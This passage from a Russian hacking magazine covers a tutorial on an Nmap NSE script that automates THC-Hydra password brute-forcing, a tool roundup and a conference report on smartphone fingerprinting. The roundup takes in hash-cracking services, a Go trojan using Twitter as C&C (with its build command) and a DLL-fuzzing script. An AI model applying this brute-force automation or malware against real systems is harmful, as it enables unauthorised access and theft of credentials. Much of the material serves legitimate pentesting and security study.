если бы в моем отчете отсутствовала информация об этой уязвимости, заказ-
чик подал бы на меня в суд. Но, так или иначе, если бы уязвимость была пропу-
щена по моей вине, меня бы мучила совесть. В таком случае следовало бы как
минимум устранить причину подобной ошибки на моей стороне и безоговороч-
но компенсировать трудозатраты по расследованию инцидента безопасности.
Ну и конечно, принять в нем активное участие.
ВЫВОДЫ
Делать какие-то конкретные выводы относительно истории с Trustwave пока
рано, посмотрим, как события будут развиваться дальше. Побывав в роли за-
казчика услуг тестирования на проникновение хотя бы пару раз (и работая
с разными компаниями), понимаешь что «пропустить» одну уязвимость, но най-
ти другую — совершенно обычная ситуация для любого исполнителя. Глупо это
отрицать.
  Я считаю, что это объяснимо — все сильно зависит от обговоренного ско-
упа, сроков выполнения работ и состава команды исполнителя. Ситуация ста-
новится печальной, когда разница в результатах работ при относительно оди-
наковых исходных данных колоссальна. На мой взгляд, обеим сторонам стоит
форсировать добавление в договор дополнительного пункта: об ответственно-
сти сторон.
  К примеру, в случае возникновения обоснованных сомнений со стороны за-
казчика в компетенции исполнителя и результатах проведенных им работ за-
казчик вправе обратиться в третью организацию для проведения аналогичных
работ. В том случае, если результат работ, проведенных третьей организаци-
ей, окажется более компетентным, недобросовестный исполнитель обязуется
компенсировать издержки заказчика.
   Немного утопично — сработает разве что в идеальном мире. Но если в до-
говоре есть информация о методологии тестирования (а также перечне тести-
руемых ресурсов и прочем), то исполнитель как минимум будет гарантировать,
что заказчик получит ожидаемый результат. Добросовестному и компетентно-
му исполнителю такой пункт нестрашен, а вот заказчика он может защитить от
недобросовестного и некомпетентного.
  Сложно будет только выбрать третью независимую организацию для про-
ведения проверки. Помимо этого, заказчику стоит отстраниться от полного
аутсорса технических компетенций. Обзавестись ими стоит хотя бы ради того,
чтобы понимать, насколько некомпетентной может оказаться компания-испол-
нитель. Что же касается исполнителя, то следует постоянно совершенствовать
технические компетенции, развиваться, следить за тенденциями как offensive-,
так и defensive-индустрии.

OUTRO
История с Trustwave очень интересна с точки зрения взаимоотношений за-
казчик — исполнитель в индустрии ИБ. Из-за отсутствия технических данных
и полных обоснований в публичном доступе нет смысла кого-то обвинять или
защищать. Остается только следить за развитием событий — возможно, этот
прецедент станет причиной появления чего-то нового в индустрии ИБ-консал-
тинга. К чему бы это нас это ни привело, делай свое дело так, чтобы тебе никог-
да не было стыдно за результат. Stay tuned!
ПОЛЕЗНАЯ ИНФОРМАЦИЯ

Общая теория по пентестам
•   Vulnerability Assessment
•  Open Source Security Testing Methodology Manual
•  The Penetration Testing Execution Standard

Немного практики
•  PentesterLab
•   Penetration Testing Practice Lab

В закладки
•  Open Penetration Testing Bookmarks Collection

Right way to contribute
•  DC7499
•  DC7812
•  2600 russian group
ВЗЛОМ





                                                                                     Ольга Баринова
                                                                                                        lely797@yandex.ruПРОКАЧАЙ
СВОЙ
NMAP

РАСШИРЯЕМ
ВОЗМОЖНОСТИ
КУЛЬТОВОГО
СКАНЕРА ПРИ
ПОМОЩИ
NSE-СКРИПТИНГА
Nmap — культовый сканер, без которого не может
обойтись практически ни один хакер, поэтому тема
расширения его возможностей, я думаю, интересует
многих. Использовать в паре с Nmap другие инстру-
менты — обычная практика. В статье речь пойдет о
том, как легко автоматизировать работу Nmap со сво-
ими любимыми инструментами. Удобнее же «нажать
одну кнопку» и получить результат, чем постоянно
проделывать одну и ту же последовательность дей-
ствий. Использование скриптов в Nmap может помочь
хакерам более автоматизированно взламывать си-
стемы, а сисадминам проверять системы на наличие
дефолтных дыр и своевременно их устранять.

ПАРУ СЛОВ ПРО NMAP
Уверена, что большинство читателей журнала «Хакер» знают, что такое Nmap,
и наверняка не раз использовали его для исследования сети и сбора инфор-
мации. Для тех же, кто подзабыл или не знает, на всякий случай напомню:
• Nmap — кросс-платформенный инструмент для сканирования сети, провер-
   ки ее безопасности, определения версий ОС и различных сервисов и мно-
   гого другого. Это очень гибкая и легко расширяемая утилита, а делает ее
   такой скриптовый движок NSE;
• NSE (Nmap Scripting Engine) — компонент Nmap, обладающий мощными
   возможностями, что позволяет пользователям писать скрипты для авто-
   матизации широкого круга сетевых задач: более гибкого взаимодействия
   с имеющимися возможностями Nmap, обнаружения и эксплуатации уязви-
   мостей и прочего. В основе NSE — интерпретатор языка Lua;
•  Lua — скриптовый язык, похожий на JavaScript.

                                                                  Рис. 1. Вывод табли-
                                                   цы Nmap
ПОСТАНОВКА ЗАДАЧИ
Как уже было сказано, сегодня мы будем заниматься расширением функци-
онала Nmap за счет написания собственных скриптов. Любой взлом/пентест
обычно начинается с разведки и сбора данных. Одним из первых проверяется
наличие на исследуемом хосте открытых портов и идентификация работающих
сервисов. Лучшего инструмента для сбора такой информации, чем Nmap, по-
жалуй, нет. Следующим шагом после сканирования обычно бывает либо по-
иск сплоита под найденный уязвимый сервис, либо подбор пары логин:пароль
с помощью метода грубой силы.
   Допустим, ты активно используешь брутфорсер THC-Hydra для подбора па-
ролей нескольких сервисов (например, HTTP-Basic, SSH, MySQL). В таком слу-
чае приходится натравливать гидру на каждый сервис отдельно, нужно запоми-
нать особенности сервисов и необходимые для запуска гидры флаги. А если
появится необходимость брутить намного больше, чем пять сервисов?.. Поче-
му бы не автоматизировать это?
   Поэтому давай напишем простенький скрипт, который будет автоматизиро-
вать процесс запуска Hydra для подбора логинов/паролей к одному сервису
(например, PostgreSQL). Для этого нам понадобятся следующие инструменты:
•  Nmap;
•  THC-Hydra;
•  любой текстовый редактор.
   Если у тебя еще не установлен Nmap и/или Hydra, немедленно исправь это:

$ sudo apt-get install nmap hydra

О’кей, начнем. Скрипты для Nmap представляют собой обычные текстовые
файлы с расширением *.nse. Поэтому открывай свой любимый текстовый ре-
дактор и создавай новый файл. Я буду использовать Vim:

$ vim hydra.nse


СТРУКТУРА NSE-СКРИПТА
Перед тем как перейти к написанию, надо сказать, что все скрипты имеют
определенную структуру. Помимо самого кода, автоматизирующего те или
иные действия, в нем присутствует описание скрипта (для чего предназначен
и как использовать), информация об авторе, лицензии, зависимость от других
скриптов, категории, к которым относится скрипт, и так далее. Давай подроб-
ней рассмотрим каждую из этих частей.
ОПИСАНИЕ СКРИПТА (DESCRIPTION)
Данный раздел содержит описание скрипта, комментарии автора, пример
отображения результата выполнения скрипта на экран, дополнительные воз-
можности.
   Для нашего скрипта, подбирающего логины/пароли к PostgeSQL, описание
будет выглядеть следующим образом:





Здесь:
•  -- — комментарий;
•  --[[  ]] — многострочный комментарий;
•  @usage, @output, @args — пример вызова скрипта, вывода результата
   на экран, необходимые аргументы при вызове.
Выше в @usage мы видим формат запуска скрипта. В данном случае указано
только имя скрипта (hydra). Это становится возможным, если скрипт положить
в директорию /<path to nmap>/nmap/scripts/, в противном случае придется
указывать абсолютный или относительный путь до него. В последующем сде-
лаем возможным задание аргументов при запуске скрипта. Аргументы задают-
ся с помощью флага --script-args «<some arguments>». В нашем случае
мы будем задавать путь до файла с логинами (lpath) и до файла с паролями
(ppath). Аргументы необязательны: по умолчанию будем искать файлы с име-
нами login.txt и password.txt в текущей директории.

КАТЕГОРИИ, В КОТОРЫХ НАХОДИТСЯ СКРИПТ (CATEGORIES)
При написании NSE-скрипта можно указать его категорию (или несколько кате-
горий). Это бывает полезно, когда пользователь Nmap хочет использовать не
конкретный скрипт, а набор скриптов, находящихся в одной категории. Пример
некоторых категорий:
•  auth — категория, в которой скрипты определяют аутентификационные дан-
  ные целевого хоста;
•  brute — категория, скрипты которой помогают определить логины и пароли
   для различных сервисов;
•  default — категория, которая содержит основные скрипты. Есть некоторые
   критерии, определяющие принадлежность скрипта к данной категории:
   скорость сканирования, полезность, надежность, конфиденциальность, на-
   глядный вывод;
•  malware — категория, помогающая определять вредоносные программы.

Например, если необходимо запустить все скрипты из категории auth, то ко-
манда будет выглядеть следующим образом:

$ nmap --script=auth example.com

В таком случае скрипты этой категории будут по очереди запускаться для ука-
занного хоста. Наш скрипт относится к категории brute. Добавим следующую
строку в файл:




ИНФОРМАЦИЯ ОБ АВТОРЕ (AUTHOR)
Каждый скрипт содержит информацию об его авторе. В моем случае:
ИНФОРМАЦИЯ ОБ ИСПОЛЬЗУЮЩЕЙСЯ ЛИЦЕНЗИИ
(LICENSE)
Nmap приветствует все разработки пользователей и призывает делиться ими,
в том числе NSE-скриптами. При указании лицензии ты подтверждаешь право
делиться скриптом с сообществом. Стандартная лицензия Nmap выглядит сле-
дующим образом:




Добавим также и эту строку в наш скрипт.

ЗАВИСИМОСТИ ОТ ДРУГИХ СКРИПТОВ (DEPENDENCIES)
Эта область содержит названия NSE-скриптов, которые должны быть выполне-
ны перед началом работы данного скрипта для получения необходимой инфор-
мации. Например,




В нашем случае такая возможность не понадобится, поэтому добавлять
dependencies мы не будем.

ХОСТ И ПОРТ (HOST & PORT)
Nmap должен знать, для каких сервисов и на каких портах запускать скрипт. Для
этого есть специальные правила:
•  prerule() — скрипт выполняется один раз перед сканированием любого
   хоста, используется для некоторых операций с сетью;
•  hostrule(host) — скрипт выполняется для каждого хоста из таблицы, ко-
   торую принимает в качестве аргумента;
•  portrule(host, port) — скрипт выполняется для каждого хоста и для каж-
   дого порта из таблиц, которые принимает в качестве аргументов;
•  postrule() — скрипт выполняется один раз после сканирования любого
   хоста. В основном используется для обработки полученных результатов,
   подведения статистики и подобного.

Для формирования таких правил есть библиотеки. В нашем скрипте необходи-
мо только указать номер порта (5432) и имя сервиса (postgresql), и тогда он бу-
дет работать лишь для данного порта и сервиса. Существует довольно популяр-
ная библиотека shortport, встроенная в NSE, в которую включены различные
методы. Мы будем использовать метод port_or_service (ports, services,
protos, states), где ports — номера портов, services — имена сервисов,
protos — имена протоколов (например, udp), states — состояния.
   Этот метод возвращает true в том случае, если в данный момент анализи-
руется сервис, находящийся на одном из портов из списка ports или соответ-
ствующий какому-нибудь сервису из списка services, кроме того, проверяет-
ся протокол и состояние на соответствие, иначе возвращается false.
   Чтобы наш скрипт работал с PostgreSQL, нужно добавить номер порта и на-
звание сервиса:




ПОДКЛЮЧЕНИЕ БИБЛИОТЕК
Отвлечемся на секунду от структуры скрипта и рассмотрим, как происходит
подключение внешних библиотек, к функциональности которых нам потребу-
ется обращаться.
   Как и в любом языке, для того чтобы использовать переменные, нужно их
сначала объявить и проинициализировать. В Lua все просто: все переменные
объявляются через local <имя_переменной>. Но прежде всего нам необходи-
мо подключить библиотеки. В Lua такая возможность реализуется с помощью
ключевого слова require. Добавим в самое начало нашего скрипта:





Таким образом мы подключили следующие библиотеки:
•  nmap — библиотека NSE, содержит внешние функции и структуры данных
  Nmap;
•  shortport — библиотека NSE, содержит функции для указания сервисов,
   портов и так далее, для которых будет запускаться скрипт;
•  stdnse — библиотека NSE, содержит стандартные NSE-функции;
•  string — библиотека Lua, содержит функции для работы со строками;
•  table — библиотека Lua для создания и модификации таблиц (ассоциатив-
   ных массивов);
•  tab — библиотека NSE для работы с таблицей Nmap для вывода результата.
Обращаясь к этим глобальным переменным, мы будем иметь доступ к функци-
ональности библиотек.

NMAP LIBS
Подробнее про библиотеки можно почитать тут в разделе Libraries.


ИНСТРУКЦИИ СКРИПТА (ACTION)
Вот мы и добрались до самого главного. В блоке action описываются дей-
ствия, которые необходимо выполнить. Как ты помнишь, мы хотим запустить
гидру, посмотреть на результат ее выполнения, вытащить нужную информацию
из результата, обработать ее и вывести в таблицу Nmap.
   Структура action-блока выглядит следующим образом:





Прежде всего объявим все необходимые переменные внутри action-блока:





Названия некоторых сервисов не совпадают для Nmap и для гидры, как, напри-
мер, в нашей ситуации. Nmap хранит значение postgresql, а Hydra как один из
флагов принимает значение postgres. Поэтому нам придется корректировать
это значение, используя условие:





Заодно мы указали количество потоков для распараллеливания для этого сер-
виса (переменная task).
   Теперь создадим таблицу, в которую будем складывать результаты брут-
форса (логины и пароли), и добавим в нее значения первой строки (названия
столбцов):





В первой строке таблицы мы указали имена столбцов. На следующем шаге
проверим, открыт ли порт, и сформируем строку с нужными флагами для запу-
ска гидры:





Флаги при запуске гидры:
•  -L (-l) <файл_с_логинами> (<один_логин>)
•  -P (-p) <файл_с_паролями> (<один_пароль>)
•  t <количество_потоков> (по дефолту 16)
•  -e ns — дополнительная проверка: n — проверка на пустой пароль, s —
   в качестве пароля проверяется логин
•  -s <номер_порта>
В конце сформированной строки указывается IP (или диапазон) и название
сервиса. Также стоит заметить, что .. используется в Lua для конкатенации
строк.

ФЛАГИ HYDRA
Подробнее о флагах и использовании THC-Hydra можно почитать здесь.


Далее нужно выполнить команду, сформированную в str. Для этого будем ис-
пользовать io.popen(str). Команда запускает программу str в отдельном
процессе и возвращает обработчик файла (handler), который мы можем ис-
пользовать для чтения данных из этой программы или для записи данных в нее.





В переменной s лежит результат работы гидры (показан на рис. 2).





Рис. 2. Вывод результата работы Hydra на экран
Мы хотим понять, получилось ли сбрутить какую-нибудь пару login:password,
для этого нам поможет regex. В библиотеке string есть метод match, который
сравнит нашу строку и регулярное выражение и в переменные login и password
положит соответствующие значения, если они есть.





Значения, попадающие в ([^%s]*), присваиваются переменным в порядке их
следования (%s — пробел). Добавим найденные логин и пароль в таблицу,
предварительно проверив на их наличие:





На этом заканчиваем обработку сервиса и закрываем цикл ( if (port.state
== «open») then … end ). Наконец, проверяем таблицу. Если в нее были до-
бавлены новые строки, кроме первой с заголовками, выводим значения в та-
блицу Nmap.





Если объект представляет собой таблицу, то Lua использует операцию # взятия
длины таблицы. Другие варианты использования # можно найти в документации.
Сейчас нам осталось только закрыть action-блок (поставить недостающий end).

LUA DOCS
Желающие поближе познакомиться с Lua могут пройти по этой ссылке.
Сохраняем скрипт в директорию /<path_to_nmap>/nmap/scripts/. Теперь
его можно запустить и посмотреть на результат. Но перед этим установим, на-
строим и добавим пользователя PostgreSQL.

НАСТРОЙКА POSTGRESQL
1. Установка и запуск. PostgreSQL должен быть в репозиториях. Если нет —
  • Качаем и устанавливаем:
    $ sudo apt-get install postgresql
  • Проверим состояние сервиса:
    $ sudo service postgresql status
  • Если сервис не запущен:
    $ sudo service postgresql start
2. Добавим Linux-пользователя. Пусть у нас будет postgresql:qwerty. Последо-
   вательность действий:
    $ sudo su
    $ adduser postgresql (попросит ввод пароля, вводим qwerty)
    $ exit
3. Далее подключимся к базе данных и добавим пользователя postgresql:
    $ su - postgres
    $ psql template1
    template1=# CREATE USER postgresql WITH PASSWORD ‘qwerty’;
    template1=# CREATE DATABASE test_db;
    template1=# GRANT ALL PRIVILEGES ON DATABASE test_db
               to postgresql;
    template1=# \q

Теперь сервис запущен и настроен и мы добавили юзера с логином и паролем.

ЗАПУСК СКРИПТА
Для начала добавим в файл login.txt наш логин postgresql и в файл
password.txt — пароль qwerty:

                                                                  Рис. 3. Пример со-
                                                          держимого файлов
                                                                    с логинами и паро-
                                                         лями
Теперь запустим скрипт:

$ nmap --script=hydra localhost

В результате его работы мы получаем таблицу, представленную на рис. 4.

                                                                  Рис. 4. Найденные
                                                             логин и пароль вну-
                                                               три таблицы Nmap





АРГУМЕНТЫ
В начале статьи я писала о том, что при данной реализации файл с логинами
и файл с паролями должны лежать в текущей директории с именами login.
txt и password.txt соответственно. Такой вариант может не всех устраивать,
поэтому давай добавим скрипту входные параметры lpath (путь до файла с
логинами) и ppath (путь до файла с паролями). То есть запуск скрипта будет
выглядеть следующим образом:

$ nmap --script=hydra --script-args “lpath=<path_to_file_with_logins>,
    ppath=<path_to_file_with_passwords>” localhost

Для этого понадобятся некоторые модификации. В начале action-блока, после
объявления переменных зарегистрируем аргументы lpath и ppath следующим
образом:
При регистрации мы указали дефолтные значения. Кроме этого, строка для за-
пуска гидры станет выглядеть следующим образом (вместо захардкоженных
значений теперь используются переменные path_login и path_password):





Все готово, можно попробовать воспользоваться аргументами.

РАСШИРЕНИЕ
Какую цель я ставила перед собой? Автоматизация работы Nmap и Hydra. Чем
больше сервисов возможно брутить одним скриптом, тем лучше. Давай сделаем
это. Теперь уже это очень просто. Добавим в portrule другие порты и сервисы:





С такими изменениями скрипт будет прекрасно работать и для добавленных
сервисов. Можно добавлять и другие сервисы, но для некоторых нужно немного
дописывать скрипт. Эти изменения обычно незначительные и очевидные (на-
пример, уменьшить/увеличить количество потоков для распараллеливания).

HYDRA.NSE
С полной версией скрипта, поддерживающей расширенный список сервисов,
ты можешь ознакомиться в моем репозитории на GitHub.


ОТЛАДКА СКРИПТОВ
После написания скрипта при его запуске могут возникнуть ошибки (например,
синтаксиса или неправильного использования). В таких случаях Nmap преду-
преждает о невозможности выполнения скрипта и советует использовать флаг
-d (см. рис. 5). Соответственно, запуск будет выглядеть примерно следующим
образом:

$ nmap --script hydra localhost -d

При таком вызове Nmap сообщит о совершенных ошибках. Если же проблема
не в синтаксисе, а в логике скрипта, то здесь поможет отладочный вывод (print).

                                                                  Рис. 5. Пример выво-
                                                            да ошибки





ЗАКЛЮЧЕНИЕ
NSE — отличный способ расширения возможностей Nmap. Надеюсь, кого-ни-
будь вдохновит моя статья и ты захочешь написать скрипт для своего любимого
инструмента. В этом случае призываю делиться своими разработками.
ВЗЛОМ





                                Дмитрий «D1g1» Евдокимов,
                                                               Digital Security
                                               @evdokimovds





СОФТ ДЛЯ ВЗЛОМА И АНАЛИЗА БЕЗОПАСНОСТИ





                         WARNING

                                    Внимание! Информация
                                          представлена
                                     исключительно с целью
                                    ознакомления! Ни авторы,
                                     ни редакция за твои
                                    действия ответственности
                                           не несут!
                  INSIDEPRO HASH VERIFIER
                      Hash Verifier (верификатор хешей) — это бесплат-
                     ный сервис для автоматической верификации хе-
                    шей и найденных к ним паролей.

                    Особенности сервиса:
                         •  не требует регистрации;
                         •  поддерживает более 30 алгоритмов хеширова-
                             ния, включая все самые популярные виды хешей;
                         •  поддерживает верификацию списка хешей (до
Автор:                        1000 строк за один запрос);
Команда InsidePro                          •  поддерживает имена пользователей и соль в шест-
                          надцатеричном формате;
URL:                         •  хранит ссылку на успешную верификацию в тече-
verifier.insidepro.com                         ние указанного времени;
                          •  данные для верификации отправляются в виде еди-
Система:                           ного списка (хеш:пароль или хеш:соль:пароль).
любая
                       Используя данный верификатор, заказчики могут
                       обезопасить себя от обмана, требуя от хешкреке-
                      ра подтверждения, что пароль действительно най-
                          ден. А хешкрекеры всегда могут убедить заказчика
                        в том, что хеш реально сломан, предоставляя ссыл-
                            ку на успешную верификацию, но не показывая сам
                         пароль.
                    В пользу сервиса говорит еще и то, что многие
                       хешкрекерские форумы добавили его принудитель-
                      ное использование для верификации всех дорогих
                        хешей.
                  INSIDEPRO HASH FINDER
                      Hash Finder — это бесплатный сервис для поиска
                     хешей по огромной базе данных.

                    Особенности сервиса:
                         •  не требует регистрации;
                         •  поддерживает более 100 алгоритмов хеширова-
                             ния, включая хеши с солью;
                         •  поддерживает поиск списка хешей (до 100 000
                           строк за один запрос);
Автор:                         •  для смешанных списков хешей выдает резуль-
Команда InsidePro                            таты по каждому алгоритму отдельно (алгоритм
                         при этом определяется автоматически);
URL:                         •  ежедневно пополняется новыми хешами и паро-
finder.insidepro.com                           лями;
                         •  очень быстрый поиск.
Система:
любая                       Главные отличия от аналогов:
                             1. Данный сервис содержит только реальные хеши
                         и пароли (около 500 миллионов записей), в от-
                          личие от других сервисов, где основная масса
                         паролей сгенерирована искусственно. По этой
                         причине процент успешного пробива на данном
                         сервисе гораздо выше.
                             2. Сервис накапливает все хеши, которые не были
                         найдены при первом поиске. Затем они ставятся
                           в очередь на брут, и пароли к таким хешам могут
                          быть найдены в дальнейшем — например, при
                         повторном пробиве оставшихся хешей спустя
                           несколько дней.
                  INSIDEPRO HASH MANAGER
                      Hash Manager — это бесплатная программа для
                       восстановления паролей к хешам.

                    Особенности программы:
                         •  заточена под работу с огромными списками хе-
                      шей (можно загружать списки на сотни миллио-
                          нов хешей и комфортно их брутить);
                        •  поддерживает более 400 алгоритмов хеширо-
                            вания;
Автор:                         •  содержит более 70 дополнительных утилит для
InsidePro Software                         работы с хешами, паролями и словарями (со-
                          ртировка файлов, удаление дубликатов, слияние
URL:                            списков, парсинг баз данных SQL, конвертеры
www.insidepro.com/                          из разных форматов и так далее);
download/HM.zip                         •  имеется 64-битная версия, которая гораздо бы-
                          стрее на многих алгоритмах;
Система:                         •  поддерживает неограниченное количество за-
Win                         гружаемых хешей, а также словарей, правил
                         и масок;
                         •  поддерживает все самые эффективные атаки
                          на хеши;
                         •  поддерживает многопоточность;
                         •  восстанавливает пароли в кодировке Unicode;
                         •  имеет модульную архитектуру.
                ПЕРЕБОР ПОДДОМЕНОВ
                             Sublist3r — это инструмент на языке Python, предна-
                       значенный для перечисления поддоменов веб-сай-
                          та с использованием поискового движка. Это отлич-
                     ный помощник для специалистов по проникновению
                           (ака пентестерам) и просто баг-хантеров для сбора
                      поддоменов интересующей их цели. На текущий мо-
                       мент Sublist3r поддерживает следующие поисковые
                        движки:
                         •  Google;
                         •  Yahoo;
Автор:                         •  Bing;
Ahmed Aboul-Ela                         •  Baidu;
                         •  Ask.
URL:
github.com/aboul3la/                         Естественно, совсем не сложно добавить и другие
Sublist3r                       поисковые движки. Так, поиск с помощью опреде-
                       ленного поискового движка представляет собой от-
Система:                      дельный класс с рядом методов и, конечно, харак-
Linux                       терной для него строкой запроса.
                        При этом инструмент собирает поддомены, исполь-
                           зуя Netcraft и DNSdumpster. И помимо этого, в Sublist3r
                        интегрирован инструмент subbrute от TheRook, чтобы
                          увеличить вероятность найти большее число поддо-
                         менов, используя перебор по словарю.
                       Из зависимостей инструмент имеет:
                         •  библиотеку Requests;
                         •  библиотеку dnspython;
                         •  библиотеку argparse.

                    Пример запуска инструмента с параметрами для
                      отображения результатов в реальном времени для
                     домена example.com:

                        $ python sublist3r.py -v -d example.com

                  В общем, отличный и очень полезный инструмент,
                       который определенно стоит взять на вооружение.
                GOLANG ADVANCED TROJAN
                    GoAT — это троян, написанный на Go и использу-
                   ющий Twitter в качестве C&C-сервера. Разработка
                       вдохновлена проектом GoBot от SaturnsVoid. GoAT
                      имеет некоторые достаточно уникальные и впечат-
                    ляющие возможности, такие как мультипоточное
                      выполнение команд и «сложный» руткит-модуль для
                      самозащиты на си.
                        Для компиляции проекта необходимо запустить
                       команду
Автор:
nottinghamprisateam                        go build -o GoAT.exe -ldflags
                            "-H windowsgui" "C:\GoAT.go"
Автор:
Peter Cunha                       Проект очень прост, но как концепт кому-нибудь мо-
                       жет быть интересен или взят за основу для создания
URL:                         чего-то более серьезного. Сама идея написания
github.com/petercunha/GoAT                       вредоносного кода на экзотических или нестан-
                       дартных для данной задачи языках программирова-
Система:                       ния в последнее время активно набирает обороты
Windows                        в среде вирусописателей. В этом плане Go — один
                        из лидирующих наряду с PowerShell. И на нем уже
                       находили действующий вредоносный код. Напри-
                        мер, Trojan.Encriyoko.
                 WADI FUZZING
                       Если ты неравнодушен к фаззингу браузеров, то
                     следующий инструмент как раз для тебя.
                          Wadi — это скрипт на Python для фаззинга бра-
                        узерного движка Edge от Microsoft на операцион-
                      ной системе Windows. В основе инструмента лежат
                       два компонента: библиотека WinAppDbg для реали-
                       зации функциональности отладчика и библиотека
                          Twisted для реализации функциональности веб-сер-
                         вера. Отладчик ответственен за запуск Edge и аттач
Авторы:                            к процессам MicrosoftEdgeCP.exe, RuntimeBroker.
Saif El-Sherei и Etienne                        exe и MicrosoftEdge.exe для мониторинга их на слу-
Stalmans                        чай падения. Веб-сервер отвечает за генерацию
                         тест-кейсов при помощи движка Google’s PyV8 и за-
URL:                      тем передачу их по запросу движку браузера.
github.com/sensepost/wadi                          Инструмент сразу разрабатывался как модуль-
                      ное приложение, и в итоге при желании каждый
Система:                        из компонентов можно заменить на собственное
Windows 10                        усмотрение. Например, файл грамматик выделен
                       отдельно от алгоритмов генерации тест-кейсов и от
                      самого Wadi, что дает пользователю возможность
                         легко модернизировать весь инструмент под себя.
                        Впервые инструмент был представлен на конфе-
                      ренции DEFCON 23 в Лас-Вегасе. Более подробно
                     об инструменте вы можете узнать из статьи Wadi
                             Fuzzer.
                АНАЛИЗ DLL МАЛВАРИ ПО-УМНОМУ
                       DLLRunner — это скрипт для умного выполнения DLL
                      при анализе вредоносного кода в системах типа
                        песочниц. Вместо того чтобы выполнять DLL-файл
                       через rundll32.exe  file.dll, данный инструмент
                        анализирует PE-заголовок и запускает все экспор-
                      тируемые функции по имени или ординалу, чтобы
                        определить, несет ли какая-нибудь из них явно вре-
                      доносную функциональность. Кроме того, для функ-
                         ций, который требуют параметры, он пытается про-
Автор:                        вести перебор вида:
Florian Roth
                        rundll32.exe path/to/file.dll,exportedfunc1 "0"
URL:                        rundll32.exe path/to/file.dll,exportedfunc1 "1"
github.com/neo23x0/                        rundll32.exe path/to/file.dll,exportedfunc1
dllrunner                            "http://evil.local"
                        rundll32.exe path/to/file.dll,exportedfunc1
Система:                            "Install"
Windows                        ...

                        Как ты понимаешь, такой скрипт может быть полезен
                      не только для анализа на вредоносную активность,
                      но и просто для фаззинга, для поиска уязвимостей.
                      Очень часто простота — залог успеха.
MALWARE: Колонка Дениса Макрушина
    POWER OF
 COMMUNITY 2015:
 ФИНГЕРПРИНТИНГ
   СМАРТФОНОВ





                      Денис Макрушин
                                                      defec.ru, twitter.com/difezza

Power of Community — южнокорейская конференция по
практической информационной безопасности, где вот
уже с 2006 года собирается преимущественно корей-
ская и китайская аудитория. Несмотря на кажущуюся
«местечковость», программа мероприятия пестрит до-
кладами спикеров из разных стран, чьи имена часто
встречаются на более крупных конференциях.
              В Сеуле меня ждало много интересного и эксклюзивного
                   контента от местных спикеров, много общения и веселый
                  CTF, построенный по принципу «сделай таски и дай решить
                   их другим». Кстати, в этом году на соревнованиях Россию
                  представляла команда, название которой ты сможешь уга-
                   дать с одной попытки, взглянув на первую фотографию, где
                  ребята вежливо «заменили» scoreboard на свою картинку.





Попробуй угадать, какая российская коман-   The Grugq открывает первый день
да посетила PoC в этом году                докладом о развитии APT и концепции
                                                    clicking-clicking war

ОТ «ОТПЕЧАТКА» АКСЕЛЕРОМЕТРА
ДО ГЛОБАЛЬНОЙ CLICKING WAR
Двухдневная программа конференции началась с вступительного слова органи-
затора. Увы, но уловить что-либо об исторических особенностях развития PoC,
о его целях и подводных камнях его организации не получилось, потому что об-
ращение было адресовано корейской аудитории. Однако после общения тет-
а-тет с организаторами стала понятна цель: популяризовать индустрию среди
молодого поколения. Другими словами: евангелизм и организация комьюнити.
   Фактически ключевым докладом, который открывает мероприятие, стала
презентация от The Grugq. С этим псевдонимом плотно ассоциируются теги
«эксплоит», «брокер», «0day». Однако в этот раз The Grugq углубился в акту-
альную нынче тему APT, попытался предсказать варианты развития таргетиро-
ванных атак в обозримом будущем и описал сценарий так называемых clicking-
clicking wars — третьей мировой войны, где каждый солдат не держит ничего
тяжелее мышки, но при этом она может стать страшным оружием в его руках.
   Доклад от Сюй Вэньюань (Wenyuan Xu), научной сотрудницы Чжэцзянского
университета (Zhejiang University), рассказывающий о том, как всевозможные
сенсоры в мобильном телефоне могут упростить задачу трекинга его поль-
зователя и однозначно идентифицировать его устройство среди других, был
подкреплен не только глубокими теоретическими обоснованиями, но и практи-
ческими результатами. Сюй Вэньюань выделила категории сенсоров, которые
тем или иным образом могут что-то рассказать об устройстве:
•  определение положения устройства;
•  определение жестов пользователя;
•  определение местоположения;
•  компас;
•  взаимодействие с другими устройствами.

Каждая из категорий обладает кон-
кретными технологическими предста-
вителями (Wi-Fi, NFC, гироскоп, GPS,
датчик температуры и прочее). В свою
очередь, каждый из них служит потен-
циальным источником для получения
уникального «отпечатка» устройства
(device fingerprinting).
  Кроме  того, имеющиеся сенсо-
ры, как известно, могут стать допол-
нительным каналом  утечки инфор-
мации — Сюй Вэньюань еще раз
                                   Сюй Вэньюань рассказывает о «недокумен-
экспериментально это подтвердила.                                       тированных» особенностях акселерометра
На размещенном неподалеку от кла-  в твоем мобильном устройстве
виатуры мобильном устройстве аксе-
лерометр зафиксировал характеристики нажатия клавиш. В процессе даль-
нейшего исследования полученных данных госпожа Сюй Вэньюань еще раз
подтвердила, что данные характеристики уникальны.
   Однако наиболее интересной частью презентации стало именно экспери-
ментальное доказательство того, что практически каждый сенсор в мобильном
устройстве может идентифицировать пользователя по нескольким параме-
трам: уникальный фингерпринт самого сенсора, который появляется в резуль-
тате особенностей его производства и особенностей его применения самим
пользователем (наличие определенных приложений в телефоне, езда в ма-
шине с мобильником на соседнем сиденье или в «бардачке», захват вибраций
от мотора и так далее). С деталями исследования рекомендую ознакомиться
в подробном вайтпепере. Электронные паспорта, биочипы и прочие попытки
«пометить» человека для того, чтобы однозначно идентифицировать его он-
лайн, — все это лишь формальные процедуры. На самом деле весь твой теле-
фон — это самый настоящий электронный паспорт, который позволяет отли-
чить тебя от сотни тысяч других владельцев подобного девайса.
Сила нажатия и продолжительность нажатия клавиши на клавиатуре, зафиксированные
акселерометром мобильного устройства

Элементарные микрорасхождения в физических параметрах компонентов аксе-
лерометра, которые образуются в результате «неидеальности» производствен-
ных процессов, рождают уникальные особенности полученного в результате
девайса. И если кому-то покажется, что нет особого смысла в фингерпринтин-
ге мобильных юзеров, то этот кто-то заблуждается.
  Уже сейчас рекламные агентства и разработчики мобильных приложений
и приложений для «носимой электроники» ведут охоту за твоими привычками
и поведением в онлайне: какие ресурсы ты посещаешь, в какое время суток ты
наиболее активен, а в какое время ты склонен делать дорогостоящие покуп-
ки, где ты любишь ужинать со своим партнером и многое другое. Только они
накапливают эту статистику не с помощью кукис-файлов твоего браузера, ко-
торые ты периодически удаляешь всевозможными клинерами, а посредством
различных вспомогательных технологий фингерпринтинга. В данном случае
сенсоры твоего мобильного устройства как нельзя лучше подходят для задач
твоей идентификации среди тысяч других посетителей твоего любимого кафе,
у которых точно такая же модель телефона, как и у тебя.
   Если также допустить тот факт, что фингерпринт не передается сам по себе,
а ему сопутствует различная полезная информация вроде истории посещений,
